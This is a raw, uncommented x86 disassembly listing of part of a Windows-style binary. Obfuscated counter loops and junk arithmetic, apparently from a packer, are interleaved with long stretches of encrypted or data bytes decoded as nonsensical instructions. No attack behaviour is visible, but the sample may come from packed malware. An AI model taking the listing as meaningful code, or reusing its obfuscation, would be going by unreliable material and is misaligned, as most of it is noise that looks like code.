  40a32c:	jl     0x40a347
  40a32e:	and    al,BYTE PTR [ebx+eax*1]
  40a331:	pop    edi
  40a332:	or     bl,ah
  40a334:	addr16 cmp ax,0x9105
  40a339:	push   ebx
  40a33a:	mov    esi,0x390d652d
  40a33f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a340:	fs jns 0x40a2ec
  40a343:	add    eax,edx
  40a345:	and    BYTE PTR [edi+0x5c],ch
  40a348:	fiadd  DWORD PTR [esi]
  40a34a:	hlt    
  40a34b:	js     0x40a2fd
  40a34d:	xchg   edi,eax
  40a34e:	mov    bh,0xb5
  40a350:	outs   dx,DWORD PTR ds:[esi]
  40a351:	jmp    0x561:0x34e1d558
  40a358:	sub    DWORD PTR [edx],eax
  40a35a:	lds    edi,FWORD PTR [ecx+0x5f111e65]
  40a360:	or     BYTE PTR [eax],dh
  40a362:	jecxz  0x40a303
  40a364:	test   al,0x9
  40a366:	cmp    esp,eax
  40a368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a369:	pop    ebp
  40a36a:	in     al,0x8b
  40a36c:	inc    edx
  40a36d:	lods   al,BYTE PTR ds:[esi]
  40a36e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a36f:	and    ch,BYTE PTR [eax+0x4c]
  40a372:	jge    0x40a3a6
  40a374:	mov    bh,0x6f
  40a376:	aad    0xb4
  40a378:	aaa    
  40a379:	leave  
  40a37a:	imul   edi,DWORD PTR [edi-0xb],0xffffffae
  40a37e:	mov    esp,0x9482ae92
  40a383:	repz rol DWORD PTR [ebx],1
  40a386:	outs   dx,BYTE PTR ds:[esi]
  40a387:	nop
  40a388:	iret   
  40a389:	xor    dh,BYTE PTR [esi+0x4e]
  40a38c:	mov    ds:0xf933ed34,al
  40a391:	outs   dx,DWORD PTR ds:[esi]
  40a392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a393:	clc    
  40a394:	cmp    ebp,eax
  40a396:	mov    ecx,DWORD PTR [ebx-0x23430eec]
  40a39c:	sub    al,0x53
  40a39e:	mov    al,ds:0x54c77376
  40a3a3:	sahf   
  40a3a4:	mov    edi,DWORD PTR [eax+0x4c]
  40a3a7:	pop    ds
  40a3a8:	clc    
  40a3a9:	xchg   DWORD PTR [eax],edx
  40a3ab:	sti    
  40a3ac:	cmp    DWORD PTR fs:[ebp+0x6a2b03c2],ecx
  40a3b3:	shl    bl,1
  40a3b5:	cld    
  40a3b6:	in     eax,dx
  40a3b7:	adc    al,0x99
  40a3b9:	pop    edx
  40a3ba:	dec    edx
  40a3bb:	icebp  
  40a3bc:	das    
  40a3bd:	dec    edi
  40a3be:	mov    dl,BYTE PTR [esi+0x51]
  40a3c1:	retf   
  40a3c2:	dec    esp
  40a3c3:	in     eax,dx
  40a3c4:	jo     0x40a430
  40a3c6:	cdq    
  40a3c7:	shl    DWORD PTR [edx-0x563d99de],1
  40a3cd:	fldenv [ecx+ecx*1-0x3f]
  40a3d1:	mov    dh,0xf3
  40a3d3:	retf   
  40a3d4:	pop    eax
  40a3d5:	adc    dh,BYTE PTR [ecx-0x237e8f8f]
  40a3db:	nop
  40a3dc:	sub    al,0xda
  40a3de:	adc    DWORD PTR [esi],ecx
  40a3e0:	mov    ch,0xcd
  40a3e2:	xchg   ecx,eax
  40a3e3:	sbb    BYTE PTR [esi],cl
  40a3e5:	xor    eax,0x4556567
  40a3ea:	cmp    BYTE PTR fs:[ecx+0x3f],cl
  40a3ee:	addr16 jmp 0x74b4eaec
  40a3f4:	mov    al,0x46
  40a3f6:	mov    BYTE PTR [esi-0x2bba380d],0x3b
  40a3fd:	test   DWORD PTR [eax+edi*8+0x3ad045c7],ebx
  40a404:	test   DWORD PTR [eax+edi*8+0x45c7ff0b],ebx
  40a40b:	int3   
  40a40c:	cmp    eax,0x1bf89c85
  40a411:	cmp    eax,0x434587
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x4344f3,0x13
  40a427:	cmp    DWORD PTR ds:0x4344f3,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x4344f3,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43460f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x4344f3
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x4344f3,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x4345fb,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x4345fb
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x4345fb,edx
  40a477:	cmp    DWORD PTR ds:0x4345fb,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x4345b7
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x4348a7
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x4345fb,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x43454b,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434593,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x434553,0x43454f
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x434577,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x434577,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434603,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x4345cb,0x43457b
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x43454f,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x43454f,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x4344f3,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x4344fb,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x4345fb,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434617
  40a564:	mov    edx,DWORD PTR ds:0x434627
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x43453f,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x43453f
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x43453f,ebx
  40a58c:	cmp    DWORD PTR ds:0x43453f,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x43453f,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x43453f
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x43453f,ebx
  40a5bc:	cmp    DWORD PTR ds:0x43453f,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x43457f
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x434537,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x43454b,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x43454b,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x43454b,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x43454b
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x43454b,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x4345c7,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x43453f,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x4345bf
  40a648:	add    DWORD PTR ds:0x434613,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x43457f,0x434607
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	div    BYTE PTR [ebp-0xd05e0f0]
  40a672:	jle    0x40a6f2
  40a674:	jo     0x40a6ef
  40a676:	jle    0x40a6f6
  40a678:	dec    ebx
  40a679:	sar    DWORD PTR [esi-0x2],0x78
  40a67d:	xchg   BYTE PTR [edi+0x47d2cfd2],ah
  40a683:	in     eax,dx
  40a684:	data16 add dl,BYTE PTR [edi-0x3f]
  40a688:	mov    ch,0x88
  40a68a:	mov    ecx,0x685aaf54
  40a68f:	scas   al,BYTE PTR es:[edi]
  40a690:	xlat   BYTE PTR ds:[ebx]
  40a691:	test   BYTE PTR [eax-0x51],0x40
  40a695:	adc    eax,0xeb254dbe
  40a69a:	leave  
  40a69b:	aas    
  40a69c:	clc    
  40a69d:	lds    esi,FWORD PTR [eax-0x49]
  40a6a0:	iret   
  40a6a1:	inc    esp
  40a6a2:	in     al,dx
  40a6a3:	shl    al,1
  40a6a5:	jle    0x40a705
  40a6a7:	and    ecx,edi
  40a6a9:	jmp    0x40a6c9
  40a6ab:	(bad)  
  40a6ac:	sbb    edx,esp
  40a6ae:	(bad)  
  40a6af:	jmp    0x40a6b0
  40a6b1:	sbb    edx,0xa92b8e45
  40a6b7:	jnp    0x40a65f
  40a6b9:	push   0xfc499112
  40a6be:	mov    al,0xd4
  40a6c0:	jbe    0x40a6bb
  40a6c2:	mov    ebp,0x14d32991
  40a6c7:	mov    esi,0xdcbb1d76
  40a6cc:	rcr    ebp,cl
  40a6ce:	pop    ds
  40a6cf:	adc    DWORD PTR [esi-0x56],0x50
  40a6d3:	pop    edx
  40a6d4:	mov    edx,0x88f635dc
  40a6d9:	inc    esp
  40a6da:	loop   0x40a715
  40a6dc:	loope  0x40a753
  40a6de:	popf   
  40a6df:	jmp    0x40a742
  40a6e1:	call   0x9f8ae0d4
  40a6e6:	pushf  
  40a6e7:	into   
  40a6e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6e9:	jmp    ecx
  40a6eb:	dec    esp
  40a6ec:	dec    edi
  40a6ed:	leave  
  40a6ee:	scas   eax,DWORD PTR es:[edi]
  40a6ef:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40a6f1:	jae    0x40a728
  40a6f3:	test   al,0x4c
  40a6f5:	les    ecx,FWORD PTR [edx]
  40a6f7:	outs   dx,BYTE PTR ds:[esi]
  40a6f8:	mov    al,BYTE PTR [ecx]
  40a6fa:	dec    eax
  40a6fb:	aad    0x32
  40a6fd:	mov    eax,0x2aef9297
  40a702:	mov    dl,0x26
  40a704:	mov    dh,0xe2
  40a706:	xchg   ebx,eax
  40a707:	adc    al,0x58
  40a709:	test   DWORD PTR [eax+0x56b12bec],edx
  40a70f:	mov    ah,0xfd
  40a711:	lock icebp 
  40a713:	mov    ebx,DWORD PTR [ecx-0x41]
  40a716:	sub    BYTE PTR [edx],0xb6
  40a719:	dec    esi
  40a71a:	add    al,0x74
  40a71c:	clc    
  40a71d:	mov    ebp,0xf9dbed00
  40a722:	mov    bh,0xbe
  40a724:	stos   BYTE PTR es:[edi],al
  40a725:	sbb    BYTE PTR [eax-0x5ec3ce71],cl
  40a72b:	adc    al,0xb2
  40a72d:	sahf   
  40a72e:	push   ss
  40a72f:	in     eax,dx
  40a730:	sbb    eax,0x7d6d30d5
  40a735:	push   esi
  40a736:	xor    eax,0xb501a490
  40a73b:	xchg   BYTE PTR [esi+0x8f349e3],dl
  40a741:	push   ds
  40a742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a743:	add    BYTE PTR [ecx+0x1613dfb3],ch
  40a749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a74a:	jae    0x40a7ba
  40a74c:	ret    0x3473
  40a74f:	xchg   ebx,eax
  40a750:	jo     0x40a7c1
  40a752:	(bad)  
  40a754:	lahf   
  40a755:	mov    ds:0x668021c2,al
  40a75a:	arpl   WORD PTR [edx+0x440d3528],ax
  40a760:	sbb    al,0xba
  40a762:	pop    esi
  40a763:	aas    
  40a764:	out    0xb5,eax
  40a766:	push   esi
  40a767:	ficomp WORD PTR [ecx-0x36]
  40a76a:	test   DWORD PTR [eax],esi
  40a76c:	push   ebx
  40a76d:	das    
  40a76e:	inc    ebp
  40a76f:	loope  0x40a6fd
  40a771:	dec    edi
  40a772:	shl    BYTE PTR [esi+0x171ffa02],0x56
  40a779:	sbb    eax,0x737f31c2
  40a77e:	xor    BYTE PTR [edx],al
  40a780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a781:	fnsave [edx]
  40a783:	sub    BYTE PTR [esi-0xea927d5],dl
  40a789:	push   esi
  40a78a:	mov    dl,0x2c
  40a78c:	jo     0x40a7d8
  40a78e:	add    DWORD PTR [ecx],ebx
  40a790:	push   ecx
  40a791:	jbe    0x40a757
  40a793:	or     ebx,eax
  40a795:	mov    bl,0x7d
  40a797:	push   eax
  40a798:	push   0xa
  40a79a:	pop    ebp
  40a79b:	int    0x2c
  40a79d:	jecxz  0x40a727
  40a79f:	pop    es
  40a7a0:	into   
  40a7a1:	sar    ah,1
  40a7a3:	aaa    
  40a7a4:	retf   
  40a7a5:	das    
  40a7a6:	xor    BYTE PTR [esi+0x3de5b08],ch
  40a7ac:	ret    
  40a7ad:	lds    eax,FWORD PTR [ebp+0x113ac304]
  40a7b3:	xchg   esi,eax
  40a7b4:	call   0x52f5:0x80e5ce32
  40a7bb:	popf   
  40a7bc:	xchg   edx,eax
  40a7bd:	dec    edi
  40a7be:	or     ebx,DWORD PTR ds:[ebx+edi*1+0x71]
  40a7c3:	pusha  
  40a7c4:	xchg   ebx,esi
  40a7c6:	jmp    0xa5dbbf7c
  40a7cb:	or     BYTE PTR [edi+0x4d],0x1e
  40a7cf:	push   0xfd496c03
  40a7d4:	inc    ecx
  40a7d5:	xchg   ebp,eax
  40a7d6:	xor    ebp,DWORD PTR [edx+0x5bc19373]
  40a7dc:	repz pop esi
  40a7de:	rcr    ecx,cl
  40a7e0:	mov    cl,0xcc
  40a7e2:	dec    edx
  40a7e3:	std    
  40a7e4:	in     eax,dx
  40a7e5:	stos   DWORD PTR es:[edi],eax
  40a7e6:	test   eax,0x4872be77
  40a7eb:	clc    
  40a7ec:	ins    BYTE PTR es:[edi],dx
  40a7ed:	xor    DWORD PTR [ebx+edx*8-0x8],ebp
  40a7f1:	pop    ebx
  40a7f2:	pop    es
  40a7f3:	dec    edi
  40a7f4:	push   ss
  40a7f5:	test   eax,0xcd3cd78e
  40a7fa:	lea    edi,[edx-0x72994fab]
  40a800:	pop    eax
  40a801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a802:	mov    ah,0x57
  40a804:	sub    BYTE PTR [ecx+0xa],dl
  40a807:	in     al,dx
  40a808:	(bad)  
  40a809:	jns    0x40a85a
  40a80b:	dec    esi
  40a80c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a80d:	mov    ecx,es
  40a80f:	adc    ebx,DWORD PTR [eax-0x61]
  40a812:	jmp    0x40a852
  40a814:	sub    al,BYTE PTR [edx+edi*2+0x66900868]
  40a81b:	(bad)  
  40a81c:	jbe    0x40a7fa
  40a81e:	lods   al,BYTE PTR ds:[esi]
  40a81f:	mov    eax,0x48fcbfb0
  40a824:	ja     0x40a87e
  40a826:	shl    BYTE PTR [ebx+0x15969095],cl
  40a82c:	mov    ds:0xc4e7f5bc,al
  40a831:	cs cli 
  40a833:	repz (bad) 
  40a836:	jge    0x40a7d4
  40a838:	jmp    0xaf9f:0x18887eb6
  40a83f:	sbb    al,0x60
  40a841:	xchg   BYTE PTR [ebx+0x2ad780a0],bl
  40a847:	into   
  40a848:	(bad)  [eax]
  40a84a:	gs cmp edi,ebx
  40a84d:	xchg   ebp,eax
  40a84e:	test   BYTE PTR [esi],bl
  40a850:	stos   DWORD PTR es:[edi],eax
  40a851:	jmp    0x7363:0x2a1e3d48
  40a858:	scas   al,BYTE PTR es:[edi]
  40a859:	push   0xffffffef
  40a85b:	pop    edx
  40a85c:	push   0xffffffbc
  40a85e:	mov    bh,0xaa
  40a860:	scas   al,BYTE PTR es:[edi]
  40a861:	outs   dx,BYTE PTR ds:[esi]
  40a862:	sar    BYTE PTR [esi],cl
  40a864:	pop    ebx
  40a865:	and    ch,BYTE PTR [ecx-0x130d15ca]
  40a86b:	sahf   
  40a86c:	pushf  
  40a86d:	neg    BYTE PTR [ebx-0x3a]
  40a870:	(bad)  
  40a871:	mov    esi,0xc4ffa1bd
  40a876:	arpl   WORD PTR [ebx],ax
  40a878:	mov    eax,0xf41a2dce
  40a87d:	dec    esi
  40a87e:	arpl   bp,si
  40a880:	arpl   di,bx
  40a882:	mov    cl,BYTE PTR [ebp-0x18]
  40a885:	add    al,0x1e
  40a887:	fadd   DWORD PTR [edi]
  40a889:	dec    ecx
  40a88a:	in     eax,0xee
  40a88c:	adc    eax,0x9447f883
  40a891:	scas   al,BYTE PTR es:[edi]
  40a892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a893:	pop    ebp
  40a894:	(bad)
  40a897:	pop    ds
  40a898:	push   ss
  40a899:	test   al,0x8
  40a89b:	xor    eax,0xd7a0cae5
  40a8a0:	test   al,0x3a
  40a8a2:	lods   eax,DWORD PTR ds:[esi]
  40a8a3:	pop    ebp
  40a8a4:	mov    dl,0x3e
  40a8a6:	dec    esi
  40a8a7:	push   esi
  40a8a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8a9:	push   es
  40a8aa:	dec    eax
  40a8ab:	pusha  
  40a8ac:	in     al,dx
  40a8ad:	daa    
  40a8ae:	and    DWORD PTR [edi],ebp
  40a8b0:	or     al,0x26
  40a8b2:	and    al,0xf0
  40a8b4:	jb     0x40a888
  40a8b6:	pop    eax
  40a8b7:	ret    0xac36
  40a8ba:	repnz cli 
  40a8bc:	nop    DWORD PTR ds:0x5e91a03f
  40a8c3:	sub    eax,0x14543e22
  40a8c8:	adc    eax,0x8c874488
  40a8cd:	push   cs
  40a8ce:	fisttp DWORD PTR [ebx+0x48]
  40a8d1:	je     0x40a877
  40a8d3:	add    ebp,ebp
  40a8d5:	not    DWORD PTR [ebp+0x12]
  40a8d8:	or     al,0x7d
  40a8da:	pop    ecx
  40a8dc:	mov    ds:0x24a5cd8c,eax
  40a8e1:	cmp    dh,BYTE PTR [eax]
  40a8e3:	adc    al,dl
  40a8e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8e6:	sbb    eax,0x3d1831d2
  40a8eb:	nop
  40a8ec:	adc    DWORD PTR [ecx],esi
  40a8ee:	lods   al,BYTE PTR ds:[esi]
  40a8ef:	adc    ecx,edx
  40a8f1:	add    al,0xfb
  40a8f3:	jns    0x40a928
  40a8f5:	shl    BYTE PTR [edx-0x6b],0x6c
  40a8f9:	mov    ebp,0x609a927e
  40a8fe:	add    DWORD PTR [eax],ebp
  40a900:	pushf  
  40a901:	and    ah,BYTE PTR ds:0x5e4249aa
  40a907:	out    0x93,eax
  40a909:	test   al,0x7
  40a90b:	pop    esi
  40a90c:	lods   eax,DWORD PTR ds:[esi]
  40a90d:	clc    
  40a90e:	sbb    DWORD PTR [eax+0x508f1aaf],edi
  40a914:	mov    ebp,0x47393eff
  40a919:	stc    
  40a91a:	lahf   
  40a91b:	sub    esi,esi
  40a91d:	test   eax,0x6f2647ef
  40a922:	aas    
  40a923:	xor    BYTE PTR [esi+0x6797f4f0],cl
  40a929:	lock imul edx
  40a92c:	scas   eax,DWORD PTR es:[edi]
  40a92d:	xchg   ebp,eax
  40a92e:	dec    esp
  40a92f:	arpl   WORD PTR [ebx+ebp*4-0x816e95e],sp
  40a936:	add    eax,ebx
  40a938:	mov    WORD PTR [eax],?
  40a93a:	rcl    DWORD PTR [esi-0x8593635],1
  40a940:	test   eax,0x4fd2afe0
  40a945:	mov    ebx,DWORD PTR [ebx+0x1e40a1a4]
  40a94b:	mov    al,0xd2
  40a94d:	dec    ebp
  40a94e:	mov    ds:0x8b9f627d,al
  40a953:	or     eax,0x5f48706c
  40a958:	mov    dl,0x75
  40a95a:	out    0x88,al
  40a95c:	cmp    edi,esp
  40a95e:	xor    edi,DWORD PTR [esi]
  40a960:	mov    esp,edi
  40a962:	pop    esi
  40a963:	add    al,0x2
  40a965:	jmp    0x5e574c87
  40a96a:	stos   DWORD PTR es:[edi],eax
  40a96b:	sub    al,0x7e
  40a96d:	dec    ebx
  40a96e:	bound  edx,QWORD PTR [edx-0x4f]
  40a971:	repnz xchg edx,eax
  40a973:	int    0x26
  40a975:	lods   al,BYTE PTR ds:[esi]
  40a976:	or     DWORD PTR [ebp+0x564294ed],edi
  40a97c:	out    0xa3,eax
  40a97e:	out    0xb2,al
  40a980:	test   al,0xa2
  40a982:	out    0xa9,eax
  40a984:	and    al,0x2c
  40a986:	jb     0x40a969
  40a988:	xlat   BYTE PTR ds:[ebx]
  40a989:	xor    ah,cl
  40a98b:	aaa    
  40a98c:	inc    ebx
  40a98d:	add    BYTE PTR [edi-0x34bf0308],ch
  40a993:	js     0x40a923
  40a995:	jo     0x40a92d
  40a997:	jge    0x40a92f
  40a999:	outs   dx,DWORD PTR ds:[esi]
  40a99a:	xor    ah,dl
  40a99c:	ins    DWORD PTR es:[edi],dx
  40a99d:	jo     0x40a952
  40a99f:	and    dl,0x27
  40a9a2:	adc    BYTE PTR [ebx-0x31e822ab],dh
  40a9a8:	fiadd  WORD PTR [edi+0x20c77993]
  40a9ae:	shl    BYTE PTR [eax+0x1],1
  40a9b1:	and    DWORD PTR [edi+0x67c540c5],0xddd058c2
  40a9bb:	int    0x19
  40a9bd:	shl    DWORD PTR [ecx+ebp*2+0x16],cl
  40a9c1:	mov    eax,ds:0x7317f63c
  40a9c6:	les    ecx,FWORD PTR [ecx]
  40a9c8:	loopne 0x40a990
  40a9ca:	not    BYTE PTR [edx+0x27db7977]
  40a9d0:	mov    cl,0x14
  40a9d2:	into   
  40a9d3:	in     eax,dx
  40a9d4:	push   edx
  40a9d5:	ins    DWORD PTR es:[edi],dx
  40a9d6:	std    
  40a9d7:	pop    esp
  40a9d8:	cmp    eax,0x3f77f286
  40a9dd:	aas    
  40a9de:	push   edi
  40a9df:	loope  0x40aa2b
  40a9e1:	lock push cs
  40a9e3:	mov    edx,DWORD PTR [ecx-0x7582e73c]
  40a9e9:	call   0x1145:0xeface16c
  40a9f0:	add    esp,DWORD PTR [edi-0x78]
  40a9f3:	fucomip st,st(4)
  40a9f5:	sub    BYTE PTR [ebp-0x6885a5c5],ah
  40a9fb:	js     0x40aa19
  40a9fd:	rcr    DWORD PTR [ebx-0x1c],1
  40aa00:	cmp    bl,0x99
  40aa03:	cli    
  40aa04:	xor    al,0xf2
  40aa06:	inc    eax
  40aa07:	mov    ebp,0xb4ec9592
  40aa0c:	stos   BYTE PTR es:[edi],al
  40aa0d:	xchg   ecx,eax
  40aa0e:	mov    dl,0x88
  40aa10:	pop    es
  40aa11:	mov    edx,0x22b8e73a
  40aa16:	dec    edx
  40aa17:	test   al,0x31
  40aa19:	out    0xe9,al
  40aa1b:	loop   0x40aa32
  40aa1d:	out    dx,al
  40aa1e:	jnp    0x40aa1c
  40aa20:	xchg   BYTE PTR [ecx],al
  40aa22:	retf   
  40aa23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa24:	aas    
  40aa25:	ja     0x40a9e8
  40aa27:	mov    es,esi
  40aa29:	aas    
  40aa2a:	ffree  st(6)
  40aa2c:	mov    WORD PTR [edx-0x5e],ds
  40aa2f:	add    ebx,DWORD PTR [edx+ebp*8]
  40aa32:	sub    DWORD PTR [esi],edx
  40aa34:	xor    eax,0xc291838b
  40aa39:	shr    DWORD PTR [eax],1
  40aa3b:	mov    edi,0xe0c70202
  40aa40:	test   BYTE PTR [ebx+0x20290264],dh
  40aa46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa47:	(bad)  
  40aa48:	pop    ds
  40aa49:	add    cl,bh
  40aa4b:	cs ja  0x40a9dd
  40aa4e:	shl    DWORD PTR [eax+0x191ae65c],1
  40aa54:	jg     0x40aabc
  40aa56:	push   es
  40aa57:	cmp    bl,BYTE PTR [edi]
  40aa59:	pop    ds
  40aa5a:	sbb    dl,cl
  40aa5c:	adc    al,0xa0
  40aa5e:	test   edx,0xd45d9a30
  40aa64:	push   esp
  40aa65:	push   ds
  40aa66:	mov    esp,0x3581c530
  40aa6b:	sub    eax,0xff6ad448
  40aa70:	popa   
  40aa71:	leave  
  40aa72:	xor    edx,eax
  40aa74:	adc    DWORD PTR ds:0x434553,0x43457f
  40aa7e:	add    edx,ecx
  40aa80:	jmp    0x40c4f6
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
  40aa88:	sub    DWORD PTR ds:0x4344f3,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x4345fb
  40aa9b:	sub    ebx,DWORD PTR ds:0x43460b
  40aaa1:	mov    DWORD PTR ds:0x4345fb,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x4345bb
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	(bad)  
  40aacb:	call   0x7e7e:0xfefcbf0f
  40aad2:	jo     0x40ab4d
  40aad4:	jle    0x40ab54
  40aad6:	(bad)
  40aada:	mov    dh,bh
  40aadc:	jbe    0x40ab0a
  40aade:	ficom  DWORD PTR [edx+0x5a]
  40aae1:	inc    ebx
  40aae2:	xor    DWORD PTR [ebx+esi*2+0x5a],edx
  40aae6:	(bad)  
  40aae8:	xor    eax,0x3ffdbc38
  40aaed:	mov    ah,0x37
  40aaef:	add    eax,0x2310b930
  40aaf4:	ins    BYTE PTR es:[edi],dx
  40aaf5:	mov    dh,0xef
  40aaf7:	(bad)  
  40aaf8:	and    eax,0x295481c3
  40aafd:	inc    ebp
  40aafe:	daa    
  40aaff:	and    DWORD PTR [esi],edx
  40ab01:	(bad)  
  40ab02:	int    0xd1
  40ab04:	mov    ds,ebx
  40ab06:	(bad)  
  40ab07:	mov    esp,0xdf6a7ab8
  40ab0c:	les    esi,FWORD PTR [edi]
  40ab0e:	and    eax,0xb3e1573d
  40ab13:	fdivr  st(4),st
  40ab15:	sti    
  40ab16:	stos   DWORD PTR es:[edi],eax
  40ab17:	sbb    edi,ecx
  40ab19:	scas   al,BYTE PTR es:[edi]
  40ab1a:	xor    esp,ebp
  40ab1c:	xchg   ebx,eax
  40ab1e:	add    cl,bl
  40ab20:	xchg   edi,eax
  40ab21:	in     eax,dx
  40ab22:	arpl   ax,si
  40ab24:	mov    ecx,0x7a63f293
  40ab29:	fdiv   DWORD PTR [edi-0x73]
  40ab2c:	in     eax,0x95
  40ab2e:	mov    ecx,0x1c263872
  40ab33:	jmp    0x4c1c:0x7f8a7c45
  40ab3a:	test   BYTE PTR [edx+0x2cddfe57],al
  40ab40:	add    al,BYTE PTR [ebx]
  40ab42:	and    DWORD PTR [eax+0x451f0f59],esp
  40ab48:	push   ebp
  40ab49:	retf   
  40ab4a:	dec    esp
  40ab4b:	std    
  40ab4c:	mov    edx,0xbfa2d72
  40ab51:	mov    esp,0x72d39478
  40ab56:	sbb    DWORD PTR [edx],ecx
  40ab58:	dec    edx
  40ab59:	adc    BYTE PTR ds:0xb5994531,bh
  40ab5f:	xlat   BYTE PTR ds:[ebx]
  40ab60:	push   esi
  40ab61:	and    ebp,ecx
  40ab63:	push   ebp
  40ab64:	(bad)  
  40ab65:	inc    ebp
  40ab66:	lods   eax,DWORD PTR ds:[esi]
  40ab67:	sub    al,BYTE PTR [eax-0x2e75ad7d]
  40ab6d:	mov    ebp,0x8abc9376
  40ab72:	add    al,0xb1
  40ab74:	mov    eax,ds:0x45c373ac
  40ab79:	pop    ss
  40ab7a:	push   edx
  40ab7b:	cmp    BYTE PTR [ebx+0x3399e4f9],al
  40ab81:	repnz ins DWORD PTR es:[edi],dx
  40ab83:	mov    ecx,0x683c03c
  40ab88:	popa   
